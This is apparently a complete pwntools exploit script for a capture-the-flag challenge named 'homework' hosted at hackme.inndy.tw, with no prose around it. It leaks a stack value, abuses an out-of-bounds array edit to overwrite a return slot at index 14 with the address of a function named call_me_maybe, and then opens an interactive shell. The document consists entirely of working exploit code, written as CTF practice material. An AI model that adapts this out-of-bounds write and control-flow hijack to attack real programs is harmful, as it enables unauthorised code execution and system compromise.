#!/usr/bin/env python
# -*-coding=utf-8-*-
from pwn import *
context.log_level = 'debug'
io = remote("hackme.inndy.tw",7701)
elf = ELF("./homework")
def recvsix():
    for i in range(5):
        io.recvline()
    io.recvuntil(' > ')
io.recvuntil("name? ")
io.sendline("usrname")

io.recvuntil("numbers\n")
io.recvuntil(" > ")
io.sendline("2")
io.recvuntil("show: ")
io.sendline("10")

canary = io.recvline()
print canary
print canary[11::]

# callsys = elf.symbols["call_me_maybe"]
recvsix()
io.sendline("1")
io.recvuntil("edit: ")
io.sendline("14")
io.recvuntil("many? ")
io.sendline("134514171")
recvsix()
io.sendline("0")
io.interactive()



